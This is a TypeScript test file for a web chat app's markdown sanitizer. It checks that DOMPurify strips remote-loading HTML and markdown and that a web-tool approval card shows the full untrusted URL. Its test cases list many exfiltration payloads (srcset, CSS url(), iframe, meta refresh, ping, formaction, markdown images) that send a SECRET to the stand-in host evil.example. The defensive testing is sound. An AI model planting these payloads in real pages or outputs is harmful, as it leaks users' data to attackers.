// Real DOMPurify (happy-dom) with the exact production config + hook, against exfiltration payloads; plus the web-tool approval card.
// happy-dom is registered for this file only and removed afterwards (test/zz-no-dom-leak.test.ts checks).
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { GlobalRegistrator } from "@happy-dom/global-registrator";

import { JSDOM } from "jsdom";
// DOMPurify is exercised on jsdom: under happy-dom 21 it does not sanitize at all (verified: <script> and onerror survive), so a happy-dom run would prove nothing.
// happy-dom is only used below, for the preact approval card.
let clean: (md: string) => string; let parse: (html: string) => Document; let render: typeof import("preact").render; let h: typeof import("preact").h; let A: typeof import("../web/src/web-approval");
beforeAll(async () => {
  GlobalRegistrator.register({ url: "http://localhost/", width: 390, height: 844 });
  const { default: createPurify } = await import("dompurify");
  const M = await import("../web/src/markdown");
  const jw = new JSDOM("").window; parse = (html) => new jw.DOMParser().parseFromString(html, "text/html") as unknown as Document;
  const p = createPurify(jw as any); // fresh instance bound to a real DOM (the module-level one may have been created without a DOM)
  expect(p.isSupported).toBe(true);
  expect(p.sanitize("<p>ok</p><script>1</script><img src=x onerror=1>")).toBe('<p>ok</p><img src="x">'); // control: this DOM really sanitizes
  M.installSanitizer(p as any);
  clean = (md) => String(p.sanitize(M.markdownToHtml(md), M.SANITIZE_CONFIG as any));
  const preact = await import("preact"); render = preact.render; h = preact.h; A = await import("../web/src/web-approval");
});
afterAll(() => { GlobalRegistrator.unregister(); });

const REMOTE = "https://evil.example/leak?d=SECRET";
describe("DOMPurify config blocks remote loads and keeps ordinary links", () => {
  const cases: Array<[string, string]> = [
    ["local src + remote srcset", `<img src="/api/x.png" srcset="${REMOTE} 2x">`],
    ["picture/source srcset", `<picture><source srcset="${REMOTE}"><img src="/api/x.png"></picture>`],
    ["video poster", `<video poster="${REMOTE}" src="${REMOTE}"></video>`],
    ["audio + source", `<audio src="${REMOTE}"><source src="${REMOTE}"></audio>`],
    ["svg image href", `<svg><image href="${REMOTE}"/><image xlink:href="${REMOTE}"/></svg>`],
    ["css url() in style attr", `<p style="background:url(${REMOTE})">x</p><img src="/api/x.png" style="background:url(${REMOTE})">`],
    ["css url() in style tag", `<style>p{background:url(${REMOTE})}</style><p>x</p>`],
    ["embed/object/iframe/link/meta", `<embed src="${REMOTE}"><object data="${REMOTE}"></object><iframe src="${REMOTE}"></iframe><link rel=stylesheet href="${REMOTE}"><meta http-equiv=refresh content="0;url=${REMOTE}">`],
    ["a ping", `<a href="https://ok.test/" ping="${REMOTE}">x</a>`],
    ["form formaction", `<form action="${REMOTE}"><button formaction="${REMOTE}">x</button></form>`],
    ["remote img html", `<img src="${REMOTE}">`],
    ["protocol-relative img", `<img src="//evil.example/a.png">`],
    ["reference-style md image", `![alt][r]\n\n[r]: ${REMOTE}`],
    ["inline md image", `![alt](${REMOTE})`],
    ["autolink", `<${REMOTE}> and ${REMOTE}`],
    ["base/area", `<base href="${REMOTE}"><map><area href="${REMOTE}"></map>`],
  ];
  for (const [name, md] of cases) test(name, () => {
    const out = clean(md); const doc = parse(out);
    for (const tag of ["video", "audio", "source", "picture", "embed", "object", "iframe", "link", "meta", "style", "svg", "image", "form", "base", "area"]) expect([tag, doc.querySelectorAll(tag).length]).toEqual([tag, 0]);
    for (const el of Array.from(doc.querySelectorAll("*"))) {
      for (const a of ["srcset", "poster", "ping", "formaction", "style", "action", "data"]) expect([el.tagName, a, el.hasAttribute(a)]).toEqual([el.tagName, a, false]);
      if (el.tagName === "IMG") expect(el.getAttribute("src")?.startsWith("/") && !el.getAttribute("src")!.startsWith("//")).toBe(true);
      else if (el.tagName !== "A") { expect(el.hasAttribute("src")).toBe(false); expect(el.hasAttribute("href")).toBe(false); }
    }
    expect(out).not.toMatch(/url\(/i);
  });
  test("<a href> stays a normal link: target _blank, rel noopener noreferrer nofollow, no ping", () => {
    const doc = parse(clean(`[x](https://ok.test/p) <a href="https://ok.test/q" ping="${REMOTE}">y</a> <${REMOTE}>`));
    const as = Array.from(doc.querySelectorAll("a")); expect(as.length).toBe(3);
    for (const a of as) { expect(a.getAttribute("target")).toBe("_blank"); expect(a.getAttribute("rel")).toBe("noopener noreferrer nofollow"); expect(a.hasAttribute("ping")).toBe(false); expect(a.getAttribute("href")).toMatch(/^https:\/\//); }
  });
  test("a local image still renders", () => {
    expect(clean("![own](/api/conversations/c1/files/gen/a.png)")).toContain('<img src="/api/conversations/c1/files/gen/a.png"');
  });
});

describe("web tool approval card shows the full URL and says the page was untrusted", () => {
  test("a 1500-char URL is rendered untruncated in one selectable element, with the untrusted note", () => {
    const url = `https://evil.example/${"a".repeat(1500)}?d=SECRET-END`;
    expect(A.webCallUrl("web_read", { url })).toBe(url); expect(A.webCallUrl("generate_image", { url })).toBeNull(); expect(A.webCallUrl("web_read", {})).toBeNull();
    const root = document.createElement("div"); document.body.appendChild(root);
    render(h(A.WebApprovalNote, { url }), root);
    const el = root.querySelector('[data-testid="web-approval-url"]')!;
    expect(el.textContent).toBe(url); expect(el.textContent).not.toContain("…");
    expect(root.querySelector('[data-testid="web-approval-why"]')!.textContent).toMatch(/untrusted/i);
    render(null, root); root.remove();
  });
});
